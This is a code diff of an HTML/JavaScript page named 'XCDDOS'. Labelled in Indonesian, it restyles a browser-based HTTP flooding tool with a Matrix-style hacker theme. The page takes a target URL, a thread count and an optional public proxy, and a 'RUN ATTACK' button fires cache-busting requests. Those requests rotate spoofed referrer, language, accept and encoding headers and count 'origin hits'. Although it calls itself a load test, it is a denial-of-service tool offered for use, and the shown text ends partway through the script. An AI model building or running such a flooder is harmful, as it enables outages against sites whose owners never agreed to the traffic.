@@ -1,576 +1,753 @@
-
 <!DOCTYPE html>
 <html lang="id">
-  <head>
+<head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FREE XCDDOS LOADTEST</title>
-<style>
-        :root {
-            --bg: #0d1117;
-            --container: #161b22;
-            --text: #c9d1d9;
-            --primary: #238636;
-            --accent: #58a6ff;
-            --danger: #da3633;
-            --warning: #d2a8ff;
-            --error: #f85149;
-            --info: #e3b341;
-            --cors: #d2a8ff;
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>XCDDOS • NEO HACKER LOADTEST</title>
+    <style>
+        /* ========== HACKER THEME : BLACK & GREEN MATRIX ========== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
+
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: var(--bg);
-            color: var(--text);
+            background-color: black;
+            font-family: 'Courier New', 'Fira Code', 'Segoe UI', monospace;
+            min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
-            margin: 0;
+            padding: 20px;
+            position: relative;
+            overflow-x: hidden;
         }
+
+        /* CANVAS RAIN (MATRIX 0/1 & XCDDOS) */
+        #matrix-canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: block;
+            pointer-events: none;   /* biar tombol tetap bisa diklik */
+            z-index: 0;
+            opacity: 0.95;
+        }
+
+        /* Container utama - transparan gelap dengan neon green */
         .container {
-            background-color: var(--container);
+            position: relative;
+            z-index: 2;
+            background: rgba(0, 0, 0, 0.82);
+            backdrop-filter: blur(2px);
+            border-radius: 18px;
             padding: 30px;
-            border-radius: 12px;
-            box-shadow: 0 8px 32px rgba(0,0,0,0.5);
             width: 90%;
-            max-width: 600px;
-            border: 1px solid #30363d;
+            max-width: 640px;
+            border: 1px solid #0f0;
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.25), inset 0 0 5px rgba(0,255,0,0.1);
+            transition: all 0.2s;
         }
-        h2 { color: var(--accent); margin-top: 0; }
-        .input-group { margin-bottom: 20px; }
-        label { display: block; margin-bottom: 8px; font-size: 0.9em; }
+
+        /* TYPOGRAPHY HACKER */
+        h2 {
+            color: #0f0;
+            text-shadow: 0 0 5px #0f0, 0 0 2px #0f0;
+            font-weight: bold;
+            letter-spacing: 2px;
+            border-left: 4px solid #0f0;
+            padding-left: 15px;
+            margin-top: 0;
+            margin-bottom: 20px;
+            font-size: 1.8rem;
+        }
+
+        label {
+            color: #8eff8e;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            font-size: 0.85rem;
+            text-transform: uppercase;
+            margin-bottom: 6px;
+            display: block;
+        }
+
         input, select {
             width: 100%;
             padding: 12px;
-            background: var(--bg);
-            border: 1px solid #30363d;
-            border-radius: 6px;
-            color: white;
+            background: #0a0f0a;
+            border: 1px solid #2e7d2e;
+            border-radius: 8px;
+            color: #c0ffc0;
+            font-family: 'Courier New', monospace;
+            font-weight: bold;
             box-sizing: border-box;
-            margin-bottom: 15px;
+            transition: 0.2s;
+            outline: none;
         }
-        /* Grid diubah menjadi 3 kolom untuk menampung input Timeout */
-        .grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 15px; }
+
+        input:focus, select:focus {
+            border-color: #0f0;
+            box-shadow: 0 0 8px #0f0;
+            background: #000000;
+        }
+
+        .grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 15px;
+            margin-bottom: 5px;
+        }
+
         button {
             width: 100%;
-            padding: 15px;
+            padding: 14px;
             border: none;
-            border-radius: 6px;
+            border-radius: 10px;
             font-weight: bold;
+            font-family: 'Courier New', monospace;
+            font-size: 1rem;
+            letter-spacing: 1.5px;
             cursor: pointer;
-            transition: 0.3s;
+            transition: 0.25s;
+            text-transform: uppercase;
         }
-        .start-btn { background-color: var(--primary); color: white; }
-        .start-btn:hover { background-color: #2ea043; }
-        .stop-btn { background-color: var(--danger); color: white; display: none; }
 
+        .start-btn {
+            background: #006400;
+            color: #baffba;
+            border: 1px solid #0f0;
+            box-shadow: 0 0 8px rgba(0,255,0,0.3);
+        }
+
+        .start-btn:hover {
+            background: #00aa2b;
+            box-shadow: 0 0 15px #0f0;
+            color: white;
+            transform: scale(1.01);
+        }
+
+        .stop-btn {
+            background: #5a0000;
+            color: #ffaaaa;
+            border: 1px solid #ff4444;
+            display: none;
+        }
+
+        .stop-btn:hover {
+            background: #a10000;
+            box-shadow: 0 0 12px red;
+        }
+
+        /* STATS PANEL - TERMINAL STYLE */
         .stats-panel {
             margin-top: 25px;
-            background: #000;
-            padding: 20px;
-            border-radius: 8px;
+            background: #030c03;
+            padding: 18px;
+            border-radius: 12px;
             font-family: 'Courier New', monospace;
-            font-size: 0.95em;
+            font-size: 0.85rem;
+            border: 1px solid #2b5e2b;
+            box-shadow: inset 0 0 12px rgba(0,30,0,0.8), 0 0 10px rgba(0,255,0,0.1);
         }
+
         .progress-container {
-            background: #30363d;
-            height: 10px;
-            border-radius: 5px;
+            background: #0f1a0f;
+            height: 12px;
+            border-radius: 12px;
             margin: 15px 0;
             overflow: hidden;
+            border: 1px solid #1f4f1f;
         }
+
         #progress-bar {
             height: 100%;
             width: 0%;
-            background: var(--accent);
-            transition: 0.1s;
+            background: #0f0;
+            box-shadow: 0 0 6px #0f0;
+            transition: 0.05s linear;
         }
-        .stat-row { display: flex; justify-content: space-between; margin: 6px 0; border-bottom: 1px dashed #30363d; padding-bottom: 4px; }
-        .stat-row:last-child { border-bottom: none; }
-        .success { color: #3fb950; }
-        .timeout-text { color: var(--warning); }
-        .cors-text { color: var(--cors); }
-        .error-text { color: var(--error); }
-        .info-text { color: var(--info); }
-        .status-badge { background: #30363d; padding: 2px 6px; border-radius: 4px; margin-left: 5px; font-size: 0.85em; display: inline-block; margin-bottom: 4px;}
-</style>
-  </head>
-  <body>
 
-        <div class="container">
-          <h2>XCDDOS</h2>
-          <div class="input-group">
-        <label>URL Target</label>
-        <input type="text" id="url" placeholder="https://example.com" oninput="saveData()">
+        .stat-row {
+            display: flex;
+            justify-content: space-between;
+            margin: 8px 0;
+            border-bottom: 1px dashed #1f4f1f;
+            padding-bottom: 5px;
+            font-weight: 500;
+        }
 
-        <label>Select Raw/Proxy (Opsional)</label>
-        <select id="proxy" onchange="handleProxyChange()">
-			<option value="" selected>RAW WITH YOUR IP</option>
-            <option value="https://api.codetabs.com/v1/proxy?quest=">PROXY WITH RAND IP</option>
-        </select>
+        .stat-row:last-child {
+            border-bottom: none;
+        }
 
-        <div class="grid">
-                  <div>
-                        <label>Durasi (Detik)</label>
-                        <input type="number" id="duration" value="30" oninput="saveData()">
-                  </div>
-                  <div>
-                        <label>Threads</label>
-                        <input type="number" id="threads" value="10">
-                  </div>
-                  <div>
-                        <label>Timeout (ms)</label>
-                        <input type="number" id="timeout-ms" value="2000" oninput="saveData()">
-                  </div>
-        </div>
-          </div>
+        .success { color: #2eff7a; text-shadow: 0 0 2px #0f0; }
+        .timeout-text { color: #ffb347; }
+        .cors-text { color: #cf9fff; }
+        .error-text { color: #ff6b6b; }
+        .info-text { color: #6effb0; }
 
-          <button id="start-btn" class="start-btn" onclick="startTest()">RUN ATTACK</button>
-          <button id="stop-btn" class="stop-btn" onclick="stopTest()">STOP</button>
+        .status-badge {
+            background: #102010;
+            padding: 3px 8px;
+            border-radius: 20px;
+            margin-left: 5px;
+            font-size: 0.75rem;
+            font-weight: bold;
+            font-family: monospace;
+            border: 0.5px solid #3a8a3a;
+        }
 
-          <div class="stats-panel">
-        <div class="stat-row">
-                  <span>Status:</span>
-                  <span id="status">Ready</span>
-        </div>
-        <div class="progress-container">
-                  <div id="progress-bar"></div>
-        </div>
-        <div class="stat-row">
-                  <span>Target IP:</span>
-                  <span id="target-ip" class="info-text">Menunggu...</span>
-        </div>
-        <div class="stat-row">
-                  <span>Total Requests:</span>
-                  <span id="total-req">0</span>
-        </div>
-            <div class="stat-row">
-                <span>X-Fetch-Mode:</span>
-                <span id="fetch_mode_ui" class="info-text">kosong</span>
+        #http-statuses {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 6px;
+            margin-top: 5px;
+        }
+
+        /* custom scroll */
+        ::-webkit-scrollbar {
+            width: 6px;
+            background: #0a0f0a;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #2e7d2e;
+            border-radius: 10px;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- CANVAS MATRIX : HUJAN ANGKA 0/1 DAN TULISAN "XCDDOS" -->
+    <canvas id="matrix-canvas"></canvas>
+
+    <div class="container">
+        <h2>⛧ XCDDOS ⛧</h2>
+        <div class="input-group">
+            <label>🎯 URL TARGET</label>
+            <input type="text" id="url" placeholder="https://target.com" oninput="saveData()">
+
+            <label>🔌 PROXY MODE (OPTIONAL)</label>
+            <select id="proxy" onchange="handleProxyChange()">
+                <option value="" selected>⚡ RAW (YOUR IP) ⚡</option>
+                <option value="https://api.codetabs.com/v1/proxy?quest=">🌐 PROXY (RANDOM IP) 🌐</option>
+            </select>
+
+            <div class="grid">
+                <div>
+                    <label>⏱️ DURASI (detik)</label>
+                    <input type="number" id="duration" value="30" oninput="saveData()">
+                </div>
+                <div>
+                    <label>🧵 THREADS</label>
+                    <input type="number" id="threads" value="10">
+                </div>
+                <div>
+                    <label>⌛ TIMEOUT (ms)</label>
+                    <input type="number" id="timeout-ms" value="2000" oninput="saveData()">
+                </div>
             </div>
-        <div class="stat-row">
-                  <span>Request Terkirim (Berhasil):</span>
-                  <span id="req-terkirim" class="success">0</span>
-        </div>
-        <div class="stat-row">
-                  <span>Request Gagal (Ke Target):</span>
-                  <span id="req-gagal" class="error-text">0</span>
-        </div>
-        <div class="stat-row">
-                  <span>Origin Hits:</span>
-                  <span id="origin-hits" class="success">0</span>
-        </div>
-        <div class="stat-row">
-                  <span>Timeouts:</span>
-                  <span id="timeouts" class="timeout-text">0</span>
-        </div>
-        <div class="stat-row">
-                  <span>CORS Errors:</span>
-                  <span id="cors-errors" class="cors-text">0</span>
-        </div>
-        <div class="stat-row">
-                  <span>Local Errors:</span>
-                  <span id="local-errors" class="error-text">0</span>
-        </div>
-        <div class="stat-row" style="flex-direction: column; align-items: flex-start;">
-                  <span style="margin-bottom: 5px;">HTTP Status Codes:</span>
-                  <div id="http-statuses" style="display: flex; flex-wrap: wrap; gap: 5px;">-</div>
-        </div>
-        <div class="stat-row" style="margin-top: 10px;">
-                  <span>Waktu Tersisa:</span>
-                  <span id="timer">0s</span>
-        </div>
-          </div>
         </div>
 
-<script>
-    let isRunning = false;
-    let requestCount = 0;
-    let originHits = 0;
-    let timeoutCount = 0;
-    let corsErrors = 0;
-    let localErrors = 0;
-    let stopTime = 0;
-    let statusCodes = {};
+        <button id="start-btn" class="start-btn" onclick="startTest()">⚔️ RUN ATTACK ⚔️</button>
+        <button id="stop-btn" class="stop-btn" onclick="stopTest()">🛑 TERMINATE 🛑</button>
 
-    const referrers = [
-        'https://www.google.com/',
-        'https://www.facebook.com/',
-        'https://t.co/',
-        'https://www.bing.com/',
-        'https://www.cloudflare.com/', 
-		'https://edge.nyc.mn/'
-    ];
-const language_header = [
-    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
-    'en-US,en;q=0.5',
-    'en-US,en;q=0.9',
-    'de-CH;q=0.7',
-    'da, en-gb;q=0.8, en;q=0.7',
-    'cs;q=0.5',
-    'nl-NL,nl;q=0.9',
-    'nn-NO,nn;q=0.9',
-    'or-IN,or;q=0.9',
-    'pa-IN,pa;q=0.9',
-    'pl-PL,pl;q=0.9',
-    'pt-BR,pt;q=0.9',
-    'pt-PT,pt;q=0.9',
-    'ro-RO,ro;q=0.9',
-    'ru-RU,ru;q=0.9',
-    'si-LK,si;q=0.9',
-    'sk-SK,sk;q=0.9',
-    'sl-SI,sl;q=0.9',
-    'sq-AL,sq;q=0.9',
-    'sr-Cyrl-RS,sr;q=0.9',
-    'sr-Latn-RS,sr;q=0.9',
-    'sv-SE,sv;q=0.9',
-    'sw-KE,sw;q=0.9',
-    'ta-IN,ta;q=0.9',
-    'te-IN,te;q=0.9',
-    'th-TH,th;q=0.9',
-    'tr-TR,tr;q=0.9',
-    'uk-UA,uk;q=0.9',
-    'ur-PK,ur;q=0.9',
-    'uz-Latn-UZ,uz;q=0.9',
-    'vi-VN,vi;q=0.9',
-    'zh-CN,zh;q=0.9',
-    'zh-HK,zh;q=0.9',
-    'zh-TW,zh;q=0.9',
-    'am-ET,am;q=0.8',
-    'as-IN,as;q=0.8',
-    'az-Cyrl-AZ,az;q=0.8',
-    'bn-BD,bn;q=0.8',
-    'bs-Cyrl-BA,bs;q=0.8',
-    'bs-Latn-BA,bs;q=0.8',
-    'dz-BT,dz;q=0.8',
-    'fil-PH,fil;q=0.8',
-    'fr-CA,fr;q=0.8',
-    'fr-CH,fr;q=0.8',
-    'fr-BE,fr;q=0.8',
-    'fr-LU,fr;q=0.8',
-    'gsw-CH,gsw;q=0.8',
-    'ha-Latn-NG,ha;q=0.8',
-    'hr-BA,hr;q=0.8',
-    'ig-NG,ig;q=0.8',
-    'ii-CN,ii;q=0.8',
-    'is-IS,is;q=0.8',
-    'jv-Latn-ID,jv;q=0.8',
-    'ka-GE,ka;q=0.8',
-    'kkj-CM,kkj;q=0.8',
-    'kl-GL,kl;q=0.8',
-    'km-KH,km;q=0.8',
-    'kok-IN,kok;q=0.8',
-    'ks-Arab-IN,ks;q=0.8',
-    'lb-LU,lb;q=0.8',
-    'ln-CG,ln;q=0.8',
-    'mn-Mong-CN,mn;q=0.8',
-    'mr-MN,mr;q=0.8',
-    'ms-BN,ms;q=0.8',
-    'mt-MT,mt;q=0.8',
-    'mua-CM,mua;q=0.8',
-    'nds-DE,nds;q=0.8',
-    'ne-IN,ne;q=0.8',
-    'nso-ZA,nso;q=0.8',
-    'oc-FR,oc;q=0.8',
-    'pa-Arab-PK,pa;q=0.8',
-    'ps-AF,ps;q=0.8',
-    'quz-BO,quz;q=0.8',
-    'quz-EC,quz;q=0.8',
-    'quz-PE,quz;q=0.8',
-    'rm-CH,rm;q=0.8',
-    'rw-RW,rw;q=0.8',
-    'sd-Arab-PK,sd;q=0.8',
-    'se-NO,se;q=0.8',
-    'si-LK,si;q=0.8',
-    'smn-FI,smn;q=0.8',
-    'sms-FI,sms;q=0.8',
-    'syr-SY,syr;q=0.8',
-    'tg-Cyrl-TJ,tg;q=0.8',
-    'ti-ER,ti;q=0.8',
-    'tk-TM,tk;q=0.8',
-    'tn-ZA,tn;q=0.8',
-    'ug-CN,ug;q=0.8',
-    'uz-Cyrl-UZ,uz;q=0.8',
-    've-ZA,ve;q=0.8',
-    'wo-SN,wo;q=0.8',
-    'xh-ZA,xh;q=0.8',
-    'yo-NG,yo;q=0.8',
-    'zgh-MA,zgh;q=0.8',
-    'zu-ZA,zu;q=0.8',
-  ];
-  const menerima = [
-        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-        'image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
-        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
-        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
-    ];
-  const encoding = [
-        'gzip, deflate, br',
-        'gzip, br',
-        'deflate',
-        'gzip, deflate, br, zstd',
-        'gzip, deflate, lzma, sdch',
-        'deflate',
-        'identity'
-    ];
-	const fetch_mode = ["navigate", "same-origin", "no-cors", "cors"];
-    window.onload = function() {
-        if(localStorage.getItem('targetUrl')) {
-            document.getElementById('url').value = localStorage.getItem('targetUrl');
-        }
-        if(localStorage.getItem('testDuration')) {
-            document.getElementById('duration').value = localStorage.getItem('testDuration');
-        }
-        if(localStorage.getItem('proxySelection')) {
-            document.getElementById('proxy').value = localStorage.getItem('proxySelection');
-        }
-        // Load data timeout jika ada
-        if(localStorage.getItem('timeoutMs')) {
-            document.getElementById('timeout-ms').value = localStorage.getItem('timeoutMs');
-        }
-    };
+        <div class="stats-panel">
+            <div class="stat-row">
+                <span>📡 STATUS:</span>
+                <span id="status" style="color:#0f0;">READY</span>
+            </div>
+            <div class="progress-container">
+                <div id="progress-bar"></div>
+            </div>
+            <div class="stat-row">
+                <span>🌐 TARGET IP:</span>
+                <span id="target-ip" class="info-text">RESOLVING...</span>
+            </div>
+            <div class="stat-row">
+                <span>📊 TOTAL REQUESTS:</span>
+                <span id="total-req">0</span>
+            </div>
+            <div class="stat-row">
+                <span>🌀 X-Fetch-Mode:</span>
+                <span id="fetch_mode_ui" class="info-text">auto</span>
+            </div>
+            <div class="stat-row">
+                <span>✅ REQ TERKIRIM (BERHASIL):</span>
+                <span id="req-terkirim" class="success">0</span>
+            </div>
+            <div class="stat-row">
+                <span>❌ REQ GAGAL (KE TARGET):</span>
+                <span id="req-gagal" class="error-text">0</span>
+            </div>
+            <div class="stat-row">
+                <span>🔥 ORIGIN HITS:</span>
+                <span id="origin-hits" class="success">0</span>
+            </div>
+            <div class="stat-row">
+                <span>⏰ TIMEOUTS:</span>
+                <span id="timeouts" class="timeout-text">0</span>
+            </div>
+            <div class="stat-row">
+                <span>🔒 CORS ERRORS:</span>
+                <span id="cors-errors" class="cors-text">0</span>
+            </div>
+            <div class="stat-row">
+                <span>💀 LOCAL ERRORS:</span>
+                <span id="local-errors" class="error-text">0</span>
+            </div>
+            <div class="stat-row" style="flex-direction: column; align-items: flex-start;">
+                <span style="margin-bottom: 5px;">📜 HTTP STATUS CODES:</span>
+                <div id="http-statuses" style="display: flex; flex-wrap: wrap; gap: 5px;">-</div>
+            </div>
+            <div class="stat-row" style="margin-top: 10px;">
+                <span>⏳ WAKTU TERSISA:</span>
+                <span id="timer">0s</span>
+            </div>
+        </div>
+    </div>
 
-    function saveData() {
-        localStorage.setItem('targetUrl', document.getElementById('url').value);
-        localStorage.setItem('testDuration', document.getElementById('duration').value);
-        localStorage.setItem('proxySelection', document.getElementById('proxy').value);
-        // Simpan data timeout
-        localStorage.setItem('timeoutMs', document.getElementById('timeout-ms').value);
-    }
-    // FITUR BARU: Handle perubahan Proxy untuk Auto Threads
-    function handleProxyChange() {
-        saveData();
-        const proxyValue = document.getElementById('proxy').value;
-        const threadsInput = document.getElementById('threads');
-        const waktunya = document.getElementById('timeout-ms');
-        // Jika menggunakan CodeTab, otomatis set Threads ke 50
-        if (proxyValue.includes('codetabs')) {
-            threadsInput.value = 50;
-            waktunya.value = 12000;
-        } else {
-            // Jika tanpa proxy, kembalikan ke default (misal 10)
-            threadsInput.value = 100;
-            waktunya.value = 15000;
-        }
-    }
-    async function resolveTargetIP(targetUrl) {
-        try {
-            document.getElementById('target-ip').innerText = "Resolving...";
-            const urlObj = new URL(targetUrl);
-            const hostname = urlObj.hostname;
+    <script>
+        // ========== CORE LOGIC (TETAP UTUH, TIDAK BERUBAH) ==========
+        let isRunning = false;
+        let requestCount = 0;
+        let originHits = 0;
+        let timeoutCount = 0;
+        let corsErrors = 0;
+        let localErrors = 0;
+        let stopTime = 0;
+        let statusCodes = {};
 
-            const res = await fetch(`https://dns.google/resolve?name=${hostname}&type=A`);
-            const data = await res.json();
+        const referrers = [
+            'https://www.google.com/',
+            'https://www.facebook.com/',
+            'https://t.co/',
+            'https://www.bing.com/',
+            'https://www.cloudflare.com/', 
+            'https://edge.nyc.mn/'
+        ];
+        const language_header = [
+            'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
+            'en-US,en;q=0.5',
+            'en-US,en;q=0.9',
+            'de-CH;q=0.7',
+            'da, en-gb;q=0.8, en;q=0.7',
+            'cs;q=0.5',
+            'nl-NL,nl;q=0.9',
+            'nn-NO,nn;q=0.9',
+            'or-IN,or;q=0.9',
+            'pa-IN,pa;q=0.9',
+            'pl-PL,pl;q=0.9',
+            'pt-BR,pt;q=0.9',
+            'pt-PT,pt;q=0.9',
+            'ro-RO,ro;q=0.9',
+            'ru-RU,ru;q=0.9',
+            'si-LK,si;q=0.9',
+            'sk-SK,sk;q=0.9',
+            'sl-SI,sl;q=0.9',
+            'sq-AL,sq;q=0.9',
+            'sr-Cyrl-RS,sr;q=0.9',
+            'sr-Latn-RS,sr;q=0.9',
+            'sv-SE,sv;q=0.9',
+            'sw-KE,sw;q=0.9',
+            'ta-IN,ta;q=0.9',
+            'te-IN,te;q=0.9',
+            'th-TH,th;q=0.9',
+            'tr-TR,tr;q=0.9',
+            'uk-UA,uk;q=0.9',
+            'ur-PK,ur;q=0.9',
+            'uz-Latn-UZ,uz;q=0.9',
+            'vi-VN,vi;q=0.9',
+            'zh-CN,zh;q=0.9',
+            'zh-HK,zh;q=0.9',
+            'zh-TW,zh;q=0.9',
+            'am-ET,am;q=0.8',
+            'as-IN,as;q=0.8',
+            'az-Cyrl-AZ,az;q=0.8',
+            'bn-BD,bn;q=0.8',
+            'bs-Cyrl-BA,bs;q=0.8',
+            'bs-Latn-BA,bs;q=0.8',
+            'dz-BT,dz;q=0.8',
+            'fil-PH,fil;q=0.8',
+            'fr-CA,fr;q=0.8',
+            'fr-CH,fr;q=0.8',
+            'fr-BE,fr;q=0.8',
+            'fr-LU,fr;q=0.8',
+            'gsw-CH,gsw;q=0.8',
+            'ha-Latn-NG,ha;q=0.8',
+            'hr-BA,hr;q=0.8',
+            'ig-NG,ig;q=0.8',
+            'ii-CN,ii;q=0.8',
+            'is-IS,is;q=0.8',
+            'jv-Latn-ID,jv;q=0.8',
+            'ka-GE,ka;q=0.8',
+            'kkj-CM,kkj;q=0.8',
+            'kl-GL,kl;q=0.8',
+            'km-KH,km;q=0.8',
+            'kok-IN,kok;q=0.8',
+            'ks-Arab-IN,ks;q=0.8',
+            'lb-LU,lb;q=0.8',
+            'ln-CG,ln;q=0.8',
+            'mn-Mong-CN,mn;q=0.8',
+            'mr-MN,mr;q=0.8',
+            'ms-BN,ms;q=0.8',
+            'mt-MT,mt;q=0.8',
+            'mua-CM,mua;q=0.8',
+            'nds-DE,nds;q=0.8',
+            'ne-IN,ne;q=0.8',
+            'nso-ZA,nso;q=0.8',
+            'oc-FR,oc;q=0.8',
+            'pa-Arab-PK,pa;q=0.8',
+            'ps-AF,ps;q=0.8',
+            'quz-BO,quz;q=0.8',
+            'quz-EC,quz;q=0.8',
+            'quz-PE,quz;q=0.8',
+            'rm-CH,rm;q=0.8',
+            'rw-RW,rw;q=0.8',
+            'sd-Arab-PK,sd;q=0.8',
+            'se-NO,se;q=0.8',
+            'si-LK,si;q=0.8',
+            'smn-FI,smn;q=0.8',
+            'sms-FI,sms;q=0.8',
+            'syr-SY,syr;q=0.8',
+            'tg-Cyrl-TJ,tg;q=0.8',
+            'ti-ER,ti;q=0.8',
+            'tk-TM,tk;q=0.8',
+            'tn-ZA,tn;q=0.8',
+            'ug-CN,ug;q=0.8',
+            'uz-Cyrl-UZ,uz;q=0.8',
+            've-ZA,ve;q=0.8',
+            'wo-SN,wo;q=0.8',
+            'xh-ZA,xh;q=0.8',
+            'yo-NG,yo;q=0.8',
+            'zgh-MA,zgh;q=0.8',
+            'zu-ZA,zu;q=0.8',
+        ];
+        const menerima = [
+            'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+            'image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
+            'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+            'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+            'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
+            'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+            'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+            'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
+        ];
+        const encoding = [
+            'gzip, deflate, br',
+            'gzip, br',
+            'deflate',
+            'gzip, deflate, br, zstd',
+            'gzip, deflate, lzma, sdch',
+            'deflate',
+            'identity'
+        ];
+        const fetch_mode = ["navigate", "same-origin", "no-cors", "cors"];
 
-            if (data.Answer && data.Answer.length > 0) {
-                document.getElementById('target-ip').innerText = data.Answer[0].data;
-            } else {
-                document.getElementById('target-ip').innerText = "IP Tidak Ditemukan";
+        window.onload = function() {
+            if(localStorage.getItem('targetUrl')) {
+                document.getElementById('url').value = localStorage.getItem('targetUrl');
             }
-        } catch (e) {
-            document.getElementById('target-ip').innerText = "Gagal Resolve IP";
-        }
-    }
+            if(localStorage.getItem('testDuration')) {
+                document.getElementById('duration').value = localStorage.getItem('testDuration');
+            }
+            if(localStorage.getItem('proxySelection')) {
+                document.getElementById('proxy').value = localStorage.getItem('proxySelection');
+            }
+            if(localStorage.getItem('timeoutMs')) {
+                document.getElementById('timeout-ms').value = localStorage.getItem('timeoutMs');
+            }
+        };
 
-    function updateStatusCodesUI() {
-        const container = document.getElementById('http-statuses');
-        if (Object.keys(statusCodes).length === 0) {
-            container.innerHTML = '-';
-            return;
-        }
-
-        let html = '';
-        for (const [code, count] of Object.entries(statusCodes)) {
-            let color = '#3fb950'; // Hijau untuk 2xx
-            const codeStr = String(code);
-
-            if (codeStr.startsWith('3')) color = '#e3b341';
-            else if (codeStr.startsWith('4')) color = '#f85149';
-            else if (codeStr.startsWith('5')) color = '#da3633';
-            else if (codeStr === 'CORS Blocked') color = '#d2a8ff';
-
-            html += `<span class="status-badge" style="color: ${color}; border: 1px solid ${color};">${code}: ${count}</span>`;
-        }
-        container.innerHTML = html;
-    }
-
-    // Fungsi untuk mengupdate total gagal
-    function updateGagalUI() {
-        const totalGagal = timeoutCount + corsErrors + localErrors;
-        document.getElementById('req-gagal').innerText = totalGagal.toLocaleString();
-    }
-
-    async function sendRequest(url) {
-        if (!isRunning || Date.now() > stopTime) return;
-
-        const proxyUrl = document.getElementById('proxy').value;
-
-        const finalUrl = proxyUrl ? proxyUrl + url : url;
-
-        const dynamicUrl = finalUrl + (finalUrl.includes('?') ? '&' : '?') + 'cb=' + Math.random().toString(36).substring(7);
-        const randomLang = language_header[Math.floor(Math.random() * language_header.length)];
-        const randomMenerima = menerima[Math.floor(Math.random() * menerima.length)];
-        const randomEncoding = encoding[Math.floor(Math.random() * encoding.length)];
-		const pilih = proxyUrl ? fetch_mode[3] : fetch_mode[2];
-    document.getElementById('fetch_mode_ui').innerText = pilih;
-        // Optimistic Tracking: Total Request selalu dihitung SEBELUM difetch/diblokir
-        if (isRunning) {
-            requestCount++;
-            document.getElementById('total-req').innerText = requestCount.toLocaleString();
+        function saveData() {
+            localStorage.setItem('targetUrl', document.getElementById('url').value);
+            localStorage.setItem('testDuration', document.getElementById('duration').value);
+            localStorage.setItem('proxySelection', document.getElementById('proxy').value);
+            localStorage.setItem('timeoutMs', document.getElementById('timeout-ms').value);
         }
 
-        try {
-            const controller = new AbortController();
-            // Ambil value dari input Timeout, fallback ke 2000 jika kosong
-            const timeoutValue = parseInt(document.getElementById('timeout-ms').value) || 2000;
-            const timeoutId = setTimeout(() => controller.abort(), timeoutValue);
+        function handleProxyChange() {
+            saveData();
+            const proxyValue = document.getElementById('proxy').value;
+            const threadsInput = document.getElementById('threads');
+            const waktunya = document.getElementById('timeout-ms');
+            if (proxyValue.includes('codetabs')) {
+                threadsInput.value = 50;
+                waktunya.value = 12000;
+            } else {
+                threadsInput.value = 100;
+                waktunya.value = 15000;
+            }
+        }
+
+        async function resolveTargetIP(targetUrl) {
+            try {
+                document.getElementById('target-ip').innerText = "Resolving...";
+                const urlObj = new URL(targetUrl);
+                const hostname = urlObj.hostname;
+                const res = await fetch(`https://dns.google/resolve?name=${hostname}&type=A`);
+                const data = await res.json();
+                if (data.Answer && data.Answer.length > 0) {
+                    document.getElementById('target-ip').innerText = data.Answer[0].data;
+                } else {
+                    document.getElementById('target-ip').innerText = "IP Tidak Ditemukan";
+                }
+            } catch (e) {
+                document.getElementById('target-ip').innerText = "Gagal Resolve IP";
+            }
+        }
+
+        function updateStatusCodesUI() {
+            const container = document.getElementById('http-statuses');
+            if (Object.keys(statusCodes).length === 0) {
+                container.innerHTML = '-';
+                return;
+            }
+            let html = '';
+            for (const [code, count] of Object.entries(statusCodes)) {
+                let color = '#3fb950';
+                const codeStr = String(code);
+                if (codeStr.startsWith('3')) color = '#e3b341';
+                else if (codeStr.startsWith('4')) color = '#f85149';
+                else if (codeStr.startsWith('5')) color = '#da3633';
+                else if (codeStr === 'CORS Blocked') color = '#d2a8ff';
+                html += `<span class="status-badge" style="color: ${color}; border: 1px solid ${color};">${code}: ${count}</span>`;
+            }
+            container.innerHTML = html;
+        }
+
+        function updateGagalUI() {
+            const totalGagal = timeoutCount + corsErrors + localErrors;
